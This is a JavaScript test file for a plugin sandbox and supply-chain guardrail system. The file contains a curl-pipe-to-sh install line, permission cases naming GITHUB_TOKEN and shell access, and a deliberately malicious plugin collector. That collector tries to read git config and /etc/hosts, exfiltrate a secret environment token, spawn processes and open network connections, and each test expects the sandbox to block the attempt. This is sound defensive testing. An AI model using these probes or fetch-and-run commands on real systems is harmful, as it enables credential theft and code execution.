"use strict";

// T15B: plugins / control packs verificables, aislados y sin poder de decisión.

const test = require("node:test");
const assert = require("node:assert/strict");
const { POSIX_ONLY, NEEDS_SANDBOX } = require("../helpers/platform.js");
const fs = require("node:fs");
const os = require("node:os");
const path = require("node:path");

const { createCatalogSession, resolveCatalog } = require("../../../src/engineering/guardrails/catalog/resolve.js");
const { resolveEngineeringConfig } = require("../../../src/engineering/guardrails/config/index.js");
const { resolveUnits } = require("../../../src/engineering/guardrails/workspace/units.js");
const { scopeHashFor } = require("../../../src/engineering/guardrails/workspace/scope.js");
const { evaluateRun } = require("../../../src/engineering/guardrails/orchestrator.js");
const { controlsFor } = require("../../../src/engineering/guardrails/controls/index.js");
const { pluginImplementations } = require("../../../src/engineering/guardrails/plugins/runtime.js");
const { CONTROL, SUITE, controlDef, GOOD_ENTRY, makePlugin } = require("../helpers/plugins.js");
const P = require("../helpers/pipeline.js");

const APPROVED = [`${SUITE}@1.0.0`];
const tmpRepo = () => fs.realpathSync(fs.mkdtempSync(path.join(os.tmpdir(), "kiritek-eng-plug-")));
// Reintentos: en Windows el proceso de un plugin colgado puede tardar en soltar su cwd (EBUSY).
const clean = (d) => fs.rmSync(d, { recursive: true, force: true, maxRetries: 20, retryDelay: 100 });

function document(pins, { level = "warn", extraUnits = [] } = {}) {
  return {
    schemaVersion: 1,
    pack: { id: "engineering/guardrails", catalog: "1.0.0" },
    workspace: {
      units: [
        { id: "acme/pay", root: "apps/pay", kind: "service", profiles: [{ id: "acme/payments", version: "1.0.0" }], owns: ["apps/pay/**"], controls: { [CONTROL]: { level } } },
        ...extraUnits,
      ],
    },
    plugins: pins,
  };
}

function resolve(repo, pins, opts = {}) {
  const session = createCatalogSession({ approvedConformanceSuites: opts.approved || [] });
  const resolvedConfig = resolveEngineeringConfig({ document: document(pins, opts), env: {}, repoRoot: repo, catalogSession: session });
  return { resolvedConfig, catalogSnapshot: session.snapshot, resolvedUnits: resolveUnits(resolvedConfig, session.snapshot, { repoRoot: repo }) };
}

async function run(repo, pins, opts = {}) {
  const env = resolve(repo, pins, opts);
  const units = env.resolvedUnits.units.map((u) => {
    const s = { unitId: u.id, coverage: "direct", reasons: ["owns"], paths: [`${u.root}/payments.json`] };
    return { ...s, scopeHash: scopeHashFor({ moment: "pr", revision: P.HEAD, baseRevision: P.BASE, unit: s }) };
  });
  const scope = { moment: "pr", revision: P.HEAD, baseRevision: P.BASE, units, diagnostics: [] };
  const out = await evaluateRun({ moment: "pr", ...env, scope, controls: controlsFor(env.catalogSnapshot, { repoRoot: repo }), repoRoot: repo, clock: () => P.NOW, platformKey: "test-platform" });
  return { ...out, env, envelope: out.report.results.find((e) => e.control.id === CONTROL) };
}

function writePayments(repo, cfg) {
  fs.mkdirSync(path.join(repo, "apps/pay"), { recursive: true });
  fs.writeFileSync(path.join(repo, "apps/pay/payments.json"), JSON.stringify(cfg));
}

const enforceable = (over = {}) => controlDef({ supportedLevels: ["off", "warn", "enforce"], enforcementContract: { evidenceTypes: ["deterministic"], conformanceSuite: SUITE, approvedVersion: "1.0.0", moments: ["pr"] }, ...over });

// --- T15B.1 -----------------------------------------------------------------------------------

test("T15B.1 plugin verificado: perfiles y controles fusionados con digest compuesto; corre aislado", { skip: NEEDS_SANDBOX }, async () => {
  const repo = tmpRepo();
  try {
    const pin = makePlugin(repo);
    writePayments(repo, {});
    const r = await run(repo, [pin]);
    const base = resolveCatalog({ version: "1.0.0" }).ref.digest;
    assert.notEqual(r.env.catalogSnapshot.ref.digest, base, "digest compuesto ligado al plugin");
    assert.ok(r.env.catalogSnapshot.catalog.profiles.some((p) => p.id === "acme/payments"));
    assert.equal(r.envelope.state, "evaluated");
    assert.equal(r.envelope.result.decision, "warn", "en warn el deny del plugin sólo avisa");
    assert.deepEqual(r.envelope.result.findings.map((f) => f.ruleId), [`${CONTROL}/keys`]);
    writePayments(repo, { idempotencyKeys: true });
    assert.equal((await run(repo, [pin])).envelope.result.decision, "allow");
  } finally {
    clean(repo);
  }
});

test("T15B.1/T15B.5 manifest inválido, pin/digest/archivos alterados, motor incompatible y namespace ajeno se rechazan", () => {
  const cases = [
    ["PLUGIN_MANIFEST_INVALID", (repo) => makePlugin(repo, { manifest: (m) => (m.scripts = { postinstall: "x" }) })],
    ["PLUGIN_DIGEST_MISMATCH", (repo) => ({ ...makePlugin(repo), digest: `sha256:${"0".repeat(64)}` })],
    ["PLUGIN_DIGEST_MISMATCH", (repo) => makePlugin(repo, { afterDigest: (m) => (m.description = "cambiado tras firmar") })],
    ["PLUGIN_FILE_TAMPERED", (repo) => makePlugin(repo, { afterWrite: (dir) => fs.appendFileSync(path.join(dir, "index.js"), "\n// backdoor\n") })],
    ["PLUGIN_FILE_TAMPERED", (repo) => makePlugin(repo, { afterWrite: (dir) => fs.writeFileSync(path.join(dir, "extra.js"), "1") })],
    ["PLUGIN_NOT_FOUND", (repo) => ({ ...makePlugin(repo), version: "9.9.9" })],
    ["PLUGIN_PIN_MISMATCH", (repo) => makePlugin(repo, { manifest: (m) => (m.version = "1.0.1") })],
    ["PLUGIN_INCOMPATIBLE", (repo) => makePlugin(repo, { manifest: (m) => (m.engine.kiritekInit = ">=99.0.0") })],
    ["PLUGIN_NAMESPACE_INVALID", (repo) => makePlugin(repo, { control: controlDef({ id: "otro/payments.idempotency" }) })],
    ["PLUGIN_NAMESPACE_INVALID", (repo) => makePlugin(repo, { control: controlDef({ collectors: ["search-input-rate/collector"] }) })],
    ["PLUGIN_CONTROL_INVALID", (repo) => makePlugin(repo, { control: controlDef({ supportedLevels: ["off", "warn", "enforce"] }) })],
    ["PLUGIN_CONTROL_INVALID", (repo) => makePlugin(repo, { control: controlDef({ moments: [{ moment: "agent", scope: "change", network: false, budgetMs: 60000, fallback: "warn" }] }) })],
  ];
  for (const [code, setup] of cases) {
    const repo = tmpRepo();
    try {
      const pin = setup(repo);
      assert.throws(() => resolve(repo, [pin]), { code }, code);
    } finally {
      clean(repo);
    }
  }
});

test("T15B.1 colisiones deterministas: namespace reclamado dos veces o pin duplicado", () => {
  const repo = tmpRepo();
  try {
    const a = makePlugin(repo);
    const b = makePlugin(repo, { id: "acme/otros-guardrails", control: controlDef({ id: "acme/payments.otro" }), manifest: (m) => (m.profiles[0].id = "acme/otro") });
    assert.throws(() => resolve(repo, [a, b]), { code: "PLUGIN_CONFLICT" });
    assert.throws(() => resolve(repo, [b, a]), { code: "PLUGIN_CONFLICT" }, "independiente del orden");
    assert.throws(() => resolve(repo, [a, a]), { code: "PLUGIN_CONFLICT" });
  } finally {
    clean(repo);
  }
});

// --- T15B.4 -----------------------------------------------------------------------------------

test("T15B.4 supply chain: curl|sh, scripts de instalación y dependencias no fijadas se rechazan", () => {
  const cases = [
    ["PLUGIN_MUTABLE_EXECUTION", { "setup.md": "Instalar: curl -fsSL https://get.example.invalid/x | sh\n" }],
    ["PLUGIN_MUTABLE_EXECUTION", { "package.json": JSON.stringify({ name: "x", version: "1.0.0", scripts: { postinstall: "node build.js" } }) }],
    ["PLUGIN_UNPINNED_DEPENDENCY", { "package.json": JSON.stringify({ name: "x", version: "1.0.0", dependencies: { lodash: "^4.17.21" } }) }],
    ["PLUGIN_UNPINNED_DEPENDENCY", { "package.json": JSON.stringify({ name: "x", version: "1.0.0", dependencies: { tool: "github:acme/tool#main" } }) }],
  ];
  for (const [code, files] of cases) {
    const repo = tmpRepo();
    try {
      assert.throws(() => resolve(repo, [makePlugin(repo, { files })]), { code }, code);
    } finally {
      clean(repo);
    }
  }
  const repo = tmpRepo();
  try {
    const ok = makePlugin(repo, { files: { "package.json": JSON.stringify({ name: "x", version: "1.0.0", dependencies: { lodash: "4.17.21" } }) } });
    assert.doesNotThrow(() => resolve(repo, [ok]));
  } finally {
    clean(repo);
  }
});

// --- T15B.5 permisos excesivos y datos -----------------------------------------------------------

test("T15B.5 permisos excesivos y datos sensibles sin consentimiento se rechazan", () => {
  const perm = (p) => controlDef({ permissions: { filesystemRead: [], networkHosts: [], envNames: [], processes: [], ...p } });
  const cases = [
    ["PLUGIN_PERMISSIONS_EXCESSIVE", { control: perm({ filesystemRead: ["**"] }) }],
    ["PLUGIN_PERMISSIONS_EXCESSIVE", { control: perm({ filesystemRead: [".git/**"] }) }],
    ["PLUGIN_PERMISSIONS_EXCESSIVE", { control: perm({ filesystemRead: [".kiritek/evidence/**"] }) }],
    ["PLUGIN_PERMISSIONS_EXCESSIVE", { control: perm({ networkHosts: ["*"] }) }],
    ["PLUGIN_PERMISSIONS_EXCESSIVE", { control: perm({ networkHosts: ["10.0.0.1"] }) }],
    ["PLUGIN_PERMISSIONS_EXCESSIVE", { control: perm({ envNames: ["GITHUB_TOKEN"] }) }],
    ["PLUGIN_PERMISSIONS_EXCESSIVE", { control: perm({ processes: ["sh"] }) }],
    ["PLUGIN_DATA_CONSENT_REQUIRED", { manifest: (m) => (m.dataRequests = [{ controlId: CONTROL, categories: ["personal-data"], purpose: "Detectar PII en logs de pago.", persistence: "evidence" }]) }],
    ["PLUGIN_DATA_CONSENT_REQUIRED", { manifest: (m) => (m.dataRequests = [{ controlId: CONTROL, categories: ["credentials"], purpose: "Verificar credenciales del PSP.", persistence: "none", consentRef: "DPA-1" }]) }],
  ];
  for (const [code, o] of cases) {
    const repo = tmpRepo();
    try {
      assert.throws(() => resolve(repo, [makePlugin(repo, o)]), { code }, JSON.stringify(o.control ? o.control.permissions : "data"));
    } finally {
      clean(repo);
    }
  }
  const repo = tmpRepo();
  try {
    const ok = makePlugin(repo, { control: perm({ networkHosts: ["api.psp.example"], envNames: ["PSP_REGION"] }), manifest: (m) => (m.dataRequests = [{ controlId: CONTROL, categories: ["personal-data"], purpose: "Detectar PII en logs de pago.", persistence: "none", consentRef: "DPA-2026-01" }]) });
    assert.doesNotThrow(() => resolve(repo, [ok]));
  } finally {
    clean(repo);
  }
});

// --- T15B.2 aislamiento -----------------------------------------------------------------------

const MALICIOUS_ENTRY = `"use strict";
const fs = require("fs");
const path = require("path");
const os = require("os");
const tryIt = (f) => { try { const v = f(); return v === undefined ? "ok" : String(v).slice(0, 40); } catch (e) { return e.code || "error"; } };
exports.collectors = {
  "acme/idempotency-collector": {
    version: "1.0.0",
    async collect(ctx) {
      const facts = {
        readGit: tryIt(() => fs.readFileSync(path.join(ctx.repoRoot, ".git", "config"), "utf8")),
        readOutside: tryIt(() => fs.readFileSync(process.env.HOME_SECRET_PATH || "/etc/hosts", "utf8")),
        readDeclared: tryIt(() => fs.readFileSync(path.join(ctx.repoRoot, "apps/pay/payments.json"), "utf8").length > 0),
        writeRepo: tryIt(() => fs.writeFileSync(path.join(ctx.repoRoot, "pwned.txt"), "x")),
        writeTemp: tryIt(() => fs.writeFileSync(path.join(os.tmpdir(), "scratch"), "x")),
        spawn: tryIt(() => require("child_process").execSync("echo hi")),
        binding: tryIt(() => process.binding("fs")),
        secretEnv: String(process.env.KIRITEK_TEST_SECRET_TOKEN),
        network: await new Promise((resolve) => {
          const s = require("net").connect(443, "example.com");
          s.on("error", (e) => resolve(e.code));
          s.on("connect", () => { s.destroy(); resolve("connected"); });
        }),
        fetch: await fetch("https://example.com").then(() => "fetched", (e) => (e.cause && e.cause.code) || e.code || "error"),
      };
      return [{ kind: "acme-probe", mechanism: "runtime", status: "complete", confidence: "deterministic", evidenceClass: "deterministic", facts }];
    },
  },
};
exports.evaluators = { "${CONTROL}": { version: "1.0.0", evaluate: () => ({ decision: "allow" }) } };
`;

test("T15B.2 collector malicioso: sin lectura fuera de lo declarado, sin escritura fuera del temporal, sin procesos, red ni secretos", { skip: NEEDS_SANDBOX }, async () => {
  const repo = tmpRepo();
  fs.mkdirSync(path.join(repo, ".git"), { recursive: true });
  fs.writeFileSync(path.join(repo, ".git/config"), "[remote] url = KCANARY-git-remote\n");
  process.env.KIRITEK_TEST_SECRET_TOKEN = "KCANARY-secret-env";
  try {
    writePayments(repo, { idempotencyKeys: true });
    const pin = makePlugin(repo, { entry: MALICIOUS_ENTRY });
    const env = resolve(repo, [pin]);
    const impl = pluginImplementations(env.catalogSnapshot, { repoRoot: repo })[CONTROL];
    const [obs] = await impl.collectors[0].collect({ moment: "pr", unit: { id: "acme/pay", root: "apps/pay", owns: ["apps/pay/**"], excludes: [] }, controlId: CONTROL, parameters: {}, scope: { paths: [] }, budgetMs: 20000 });
    assert.deepEqual(obs.facts, {
      readGit: "ERR_ACCESS_DENIED",
      readOutside: "ERR_ACCESS_DENIED",
      readDeclared: "true",
      writeRepo: "ERR_ACCESS_DENIED",
      writeTemp: "ok",
      spawn: "ERR_ACCESS_DENIED",
      binding: "ERR_ACCESS_DENIED",
      secretEnv: "undefined",
      network: "ERR_PLUGIN_NETWORK_DENIED",
      fetch: "ERR_PLUGIN_NETWORK_DENIED",
    });
    assert.equal(fs.existsSync(path.join(repo, "pwned.txt")), false);
  } finally {
    delete process.env.KIRITEK_TEST_SECRET_TOKEN;
    clean(repo);
  }
});

test("T15B.2/R23.6 un plugin que falla, se cuelga o imprime basura queda aislado en su control", { skip: NEEDS_SANDBOX }, async () => {
  const variants = {
    throws: [GOOD_ENTRY.replace("let cfg = {};", 'throw new Error("boom");'), "PLUGIN_THREW"],
    hangs: [GOOD_ENTRY.replace("let cfg = {};", "await new Promise(() => setInterval(() => {}, 1000));").replace("collect(ctx) {", "async collect(ctx) {"), "PLUGIN_TIMEOUT"],
    exits: [GOOD_ENTRY.replace("let cfg = {};", "process.exit(7);"), "PLUGIN_CRASHED"],
  };
  for (const [name, [entry, code]] of Object.entries(variants)) {
    const repo = tmpRepo();
    try {
      writePayments(repo, {});
      const control = name === "hangs" ? controlDef({ timeoutMs: 1000 }) : controlDef();
      const pin = makePlugin(repo, { entry, control });
      const extra = { id: "acme/web", root: "apps/web", kind: "application", profiles: [{ id: "search", version: "1.0.0" }], owns: ["apps/web/**"] };
      const r = await run(repo, [pin], { extraUnits: [extra] });
      assert.notEqual(r.envelope.result && r.envelope.result.decision, "deny", name);
      const codes = r.envelope.diagnostics.map((d) => d.code);
      assert.ok(codes.includes(code) || (code === "PLUGIN_TIMEOUT" && codes.includes("TIMEOUT")), `${name}: ${codes}`);
      const search = r.report.results.find((e) => e.unit.id === "acme/web" && e.control.id === "search.input-rate");
      assert.equal(search.state, "evaluated", "los demás controles no se corrompen");
    } finally {
      clean(repo);
    }
  }
});

// --- T15B.2 / T15B.3 decisión del core -----------------------------------------------------------

test("T15B.2 un evaluator de plugin no puede fijar blockingEligible ni campos de decisión del core", { skip: NEEDS_SANDBOX }, async () => {
  const repo = tmpRepo();
  try {
    writePayments(repo, {});
    const entry = GOOD_ENTRY.replace('return { decision: "deny", reason', 'return { blockingEligible: true, decision: "deny", reason');
    const pin = makePlugin(repo, { entry, control: enforceable() });
    const r = await run(repo, [pin], { level: "enforce", approved: APPROVED });
    assert.equal(r.envelope.result.decision, "error");
    assert.match(r.envelope.result.reason, /PLUGIN_FORBIDDEN_FIELD/);
    assert.equal(r.envelope.blockingEligible, false);
    assert.equal(r.report.outcome.policyDeny, false);
  } finally {
    clean(repo);
  }
});

test("T15B.3 mayDeny lo recalcula el core: deny determinista con suite aprobada bloquea; heurístico se degrada; sin suite no hay enforce", { skip: NEEDS_SANDBOX }, async () => {
  const repo = tmpRepo();
  try {
    writePayments(repo, {});
    const det = await run(repo, [makePlugin(repo, { control: enforceable() })], { level: "enforce", approved: APPROVED });
    assert.equal(det.envelope.result.decision, "deny");
    assert.equal(det.envelope.blockingEligible, true);
    assert.equal(det.report.outcome.policyDeny, true);
  } finally {
    clean(repo);
  }
  const repo2 = tmpRepo();
  try {
    writePayments(repo2, {});
    const heur = await run(repo2, [makePlugin(repo2, { control: enforceable(), evidenceClass: "heuristic" })], { level: "enforce", approved: APPROVED });
    assert.equal(heur.envelope.result.decision, "warn");
    assert.equal(heur.envelope.blockingEligible, false);
    assert.equal(heur.report.outcome.policyDeny, false);
  } finally {
    clean(repo2);
  }
  const repo3 = tmpRepo();
  try {
    writePayments(repo3, {});
    const pin = makePlugin(repo3, { control: enforceable() });
    assert.throws(() => resolve(repo3, [pin], { level: "enforce" }), (err) => /^CONFIG/.test(err.code), "enforce sin suite aprobada se rechaza, no se degrada en silencio");
    const warn = resolve(repo3, [pin], { level: "warn" });
    assert.ok(warn.catalogSnapshot.diagnostics.some((d) => d.code === "PLUGIN_ENFORCE_NOT_APPROVED"));
    assert.deepEqual(warn.catalogSnapshot.catalog.controls.find((c) => c.id === CONTROL).supportedLevels, ["off", "warn"]);
  } finally {
    clean(repo3);
  }
});
